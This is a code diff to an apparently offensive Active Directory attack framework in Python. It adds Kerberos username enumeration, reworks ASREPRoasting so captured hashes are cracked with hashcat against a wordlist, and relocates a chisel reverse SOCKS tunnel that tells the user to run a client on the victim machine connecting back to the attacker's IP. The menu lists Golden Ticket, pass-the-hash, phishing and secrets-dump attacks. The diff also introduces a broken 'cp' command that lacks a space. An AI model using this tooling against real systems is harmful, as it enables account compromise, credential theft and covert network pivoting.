@@ -15,6 +15,7 @@
 # -------------------------------------------------------------------------------------
 
 import os
+import re
 import sys
 import time
 import json
@@ -139,9 +140,16 @@ def test_TSH():
       return 0
       
 def lineCount(variable):
-   localCOM("cat " + variable + " | wc -l > count.tmp")
-   count = int(linecache.getline("count.tmp", 1).rstrip("\n"))
+   localCOM("wc -l " + variable + " > count.tmp")
+   count = (linecache.getline("count.tmp", 1).rstrip("\n"))
+   count = extract_numbers(count)
+   count = count.rstrip(" ")
+   count = int(count)
    return count
+   
+def extract_numbers(input_string):
+    return re.sub(r'\D', '', input_string)
+
 
 def spacePadding(variable,value):
    variable = variable.rstrip("\n")
@@ -659,7 +667,10 @@ def dispMenu():
       print(colored(COM.upper(),colour7), end=' ')
    else:
       print(colored(COM.upper(),colour6), end=' ')      
-   print('\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour5) + (" ")*16 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551' + " PORT  " + '\u2551' + " TCP SERVICE" + (" ")*22 + '\u2551' + " PORT  " + '\u2551' + " UDP SERVICE" + (" ")*22 + '\u2551' + " LOCAL IP ", end=' ')
+   print('\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAMES",colour5) + (" ")*15 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551' + " PORT  " + '\u2551' + " TCP SERVICE" + (" ")*22 + '\u2551' + " PORT  " + '\u2551' + " UDP SERVICE" + (" ")*22 + '\u2551' + " LOCAL IP ", end=' ')
+   
+# ADD IN THE NUMER OF USERNAMES IN THE LIST ON THE BANNER HERE   
+   
    print(colored(localIP2,colour6), end=' ') 
    print((" ")*36 + '\u2551') 
    print('\u2560' + ('\u2550')*14 + '\u256C' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' +  ('\u2550')*63 + '\u2563')   
@@ -690,7 +701,10 @@ def dispMenu():
       if (loop == 4) & (WEB[:5] == "EMPTY"):
          print(colored(WEB[:COL1],colour7), end=' ')
       else: 
-         if(loop == 4): print(colored(WEB[:COL1],colour6), end=' ')         
+         if(loop == 4): print(colored(WEB[:COL1],colour6), end=' ')
+         
+# ADD THE WAF STATUS HERE         
+                  
       if loop == 5:
          if (EMPTY_5[:7] == "FOUND  "): print (colored(EMPTY_5,colour6[:COL1]), end=' ')
          if (EMPTY_5[:7] == "UNKNOWN"): print (colored(EMPTY_5,colour7[:COL1]), end=' ')  
@@ -786,15 +800,15 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Kerb Ticket (71) ServScanner (81) GRP Scanner (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600)                (700) Certipy VULN (710) Certipy ESC10    " + '\u2551')   
-   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Silv Ticket (72) VulnScanner (82) GRP  SHARES (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601)                (701) Certipy ESC1 (711) Certipy ESC11    " + '\u2551')      
+   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Kerb Ticket (71) ServScanner (81) GRP Scanner (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600)                (700) Certipy VULN (710) Certipy   ESC10  " + '\u2551')   
+   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Silv Ticket (72) VulnScanner (82) GRP  SHARES (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601)                (701) Certipy ESC1 (711) Certipy   ESC11  " + '\u2551')      
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Gold Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Wordpress Scan (602) LAPS    Dumper (702) Certipy ESC2                        " + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Gold DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503) WP Plugin Scan (603) Secrets   Dump (703) Certipy ESC3                        " + '\u2551')
    print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504) LFI OS Checker (604) Crack-Map-Exec (704) Certipy ESC4                        " + '\u2551')
    print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (505) LFI   Wordlist (605) Domain    Dump (705) Certipy ESC5                        " + '\u2551')
-   print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set CHISEL64  (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (606) Blood    Hound (706) Certipy ESC6                        " + '\u2551')
-   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448) HTTP GitDump (507)                (607) Neo4j  Console (707) Certipy ESC7                        " + '\u2551')
-   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59)               (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (608) Neo4j Database (708) Certipy ESC8 (998) SSH Port Forward " + '\u2551')
+   print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set           (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (606) Blood    Hound (706) Certipy ESC6 (996) MANUAL CHISEL64  " + '\u2551')
+   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448) HTTP GitDump (507)                (607) Neo4j  Console (707) Certipy ESC7 (997) DEPLOY CHISEL64  " + '\u2551')
+   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59)               (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (608) Neo4j Database (708) Certipy ESC8 (998) SSH PortForward  " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60)               (70)             (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350) ADD AD Usernames (450)              (509)                (609) BloodHound GUI (709) Certipy ESC9 (999)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ' + "     " + '\u2551')
@@ -828,7 +842,7 @@ else:
 # -------------------------------------------------------------------------------------
 
 netWork = "tun0"							# LOCAL INTERFACE
-maxUser = 5000								# UNLIMITED VALUE
+maxUser = 13000								# UNLIMITED VALUE
 colour0 = "red"								# DISPLAY COLOURS
 colour1 = "grey"
 colour2 = "cyan"
@@ -1683,43 +1697,6 @@ while True:
          localCOM("xdotool key Ctrl+Tab")
       else:
          pass
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Start local linux/windows chisel server
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '17':
-      if OSF[:5] == "LINUX":      
-         portChoice = input("[?] Please enter the receiving port number: ")
-         if portChoice.isnumeric():
-            targetChoice = input("[?] Please enter the target port number: ")
-            if targetChoice.isnumeric():
-               print(colored("[*] Starting local linux chisel server...", colour3))
-               print("[!] Use the command: ./lin_chisel64 client " + localIP2.rstrip(" ") + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " on the remote machine...")
-               localCOM("xdotool key Ctrl+Shift+T")
-               localCOM("xdotool key Alt+Shift+S; xdotool type 'LINUX CHISEL SERVER'; xdotool key Return")
-               dispBanner("LINUX CHISEL SERVER",0) 
-               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-               localCOM("xdotool type './" + httpDir + "/linux/lin_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
-               localCOM("xdotool key Ctrl+Tab")
-      else:
-         portChoice = input("[?] Please enter the receiving port number: ")
-         if portChoice.isnumeric():
-            targetChoice = input("[?] Please enter the target port number: ")
-            if targetChoice.isnumeric():
-               print(colored("[*] Starting local windows chisel server...", colour3))
-               print("[!] Use the command: ./win_chisel64 client " + localIP2.rstrip(" ") + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " on the remote machine...")
-               localCOM("xdotool key Ctrl+Shift+T")
-               localCOM("xdotool key Alt+Shift+S; xdotool type 'WINDOWS CHISEL SERVER'; xdotool key Return")
-               dispBanner("WINDOWS CHISEL SERVER",0) 
-               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-               localCOM("xdotool type './" + httpDir + "/windows/win_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
-               localCOM("xdotool key Ctrl+Tab")
       prompt() 
          
 # ------------------------------------------------------------------------------------- 
@@ -2398,7 +2375,9 @@ while True:
       if checkParam != 1:
          checkParam = test_PRT("88")               
       if checkParam != 1:
-         print(colored("[*] Enumerating remote server for valid usernames, please wait...", colour3))
+         print(colored("[*] Enumerating remote server for valid usernames, please wait this could take sometime...", colour3))
+         countName = lineCount(dataDir + "/usernames.txt")
+         print("[+] Checking " + str(countName) + " usernames...")
          remoteCOM("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=" + dataDir + "/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
          localCOM("sed -i '/@/!d' users.tmp")							# PARSE FILE 1
          localCOM("sort -r users.tmp > sortedusers.tmp")                  
@@ -2409,9 +2388,9 @@ while True:
                username, null = username.split("@")
                if username != "":
                   parse.write(username + "\n")                  
-         count = lineCount("validusers.tmp")         
+         count = lineCount("validusers.tmp")
          if count > 0:
-            print("[+] Found valid usernames...\n")                                         
+            print("[+] Found " + str(count) + " valid usernames...\n")                                         
             with open("validusers.tmp", "r") as read:
                for loop in range(0, count):
                   checkname = read.readline().rstrip("\n")
@@ -2517,30 +2496,26 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      checkParam = test_TIP()      
+      checkParam = test_DOM()                
       if checkParam != 1:
-         checkParam = test_DOM()          
-      if checkParam != 1:      
-         localCOM("touch authorised.tmp")         
+         print(colored("[*] Peforming ASREPRoasting please wait this could take sometime ...", colour3))
+         localCOM("touch authorised.tmp")
          with open(dataDir + "/usernames.txt", "r") as read:
             for x in range(0, maxUser):
                line = read.readline().rstrip("\n")
                if VALD[x] == "1":
-                  localCOM("echo " + line + " >> authorised.tmp")                        
-         count = lineCount("authorised.tmp")                       
-         if count > 0:           
-            with open(dataDir + "/usernames.txt", "r") as read:
-               for x in range(0, maxUser):
-                  line = read.readline().rstrip("\n")
-                  localCOM("echo " + line + " >> authorised.tmp")      
-         else:
+                  localCOM("echo " + line + " >> authorised.tmp")
+         count = lineCount("authorised.tmp")      
+         if count == 0:
             print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")
-            localCOM("cp " + dataDir + "/usernames.txt authorised.tmp")              
-         if checkParam != 1:
-            remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
-            print(colored("[*] Cracking hash values if they exists...\n", colour3))
-            localCOM("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
-            localCOM("strings cracked2.txt")         
+            localCOM("cp" + dataDir + "/usernames.txt authorised.tmp")
+         countName = lineCount("authorised.tmp")
+         print("[+] Checking " + str(countName) + " usernames...")
+         remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp 2>&1 > temp.tmp")
+         print(colored("[*] Cracking hash values if they exists...\n", colour3))
+         catsFile("hashroast2.tmp")
+         localCOM("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.tmp 2>&1 > temp.tmp")
+         catsFile("cracked2.tmp")       
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3970,7 +3945,8 @@ while True:
 # -------------------------------------------------------------------------------------        
 
    if selection == '350':
-      print(colored("[*] Populating 13000 usernames into a Active Directory listing...\n", colour3))            
+      countName = lineCount(explDir + "/kerberosnames.txt")
+      print(colored("[*] Populating " + str(countName) + " usernames into a Active Directory listing...\n", colour3))            
       localCOM("cp ./" + explDir + "/kerberosnames.txt ./" + dataDir + "/usernames.txt")
       apend = str("@" +  DOM.rstrip(" "))
       localCOM("sed -e 's/$/" + apend + "/' -i " + dataDir + "/usernames.txt")
@@ -4587,6 +4563,43 @@ while True:
             else:
                print("[-] SeMachineAccountPrivilege is not enabled...")
       prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Start local linux/windows chisel server
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '996':
+      if OSF[:5] == "LINUX":      
+         portChoice = input("[?] Please enter the receiving port number: ")
+         if portChoice.isnumeric():
+            targetChoice = input("[?] Please enter the target port number: ")
+            if targetChoice.isnumeric():
+               print(colored("[*] Starting local linux chisel server...", colour3))
+               print("[!] Use the command: ./lin_chisel64 client " + localIP2.rstrip(" ") + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " on the remote machine...")
+               localCOM("xdotool key Ctrl+Shift+T")
+               localCOM("xdotool key Alt+Shift+S; xdotool type 'LINUX CHISEL SERVER'; xdotool key Return")
+               dispBanner("LINUX CHISEL SERVER",0) 
+               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+               localCOM("xdotool type './" + httpDir + "/linux/lin_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
+               localCOM("xdotool key Ctrl+Tab")
+      else:
+         portChoice = input("[?] Please enter the receiving port number: ")
+         if portChoice.isnumeric():
+            targetChoice = input("[?] Please enter the target port number: ")
+            if targetChoice.isnumeric():
+               print(colored("[*] Starting local windows chisel server...", colour3))
+               print("[!] Use the command: ./win_chisel64 client " + localIP2.rstrip(" ") + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " on the remote machine...")
+               localCOM("xdotool key Ctrl+Shift+T")
+               localCOM("xdotool key Alt+Shift+S; xdotool type 'WINDOWS CHISEL SERVER'; xdotool key Return")
+               dispBanner("WINDOWS CHISEL SERVER",0) 
+               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+               localCOM("xdotool type './" + httpDir + "/windows/win_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
+               localCOM("xdotool key Ctrl+Tab")
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
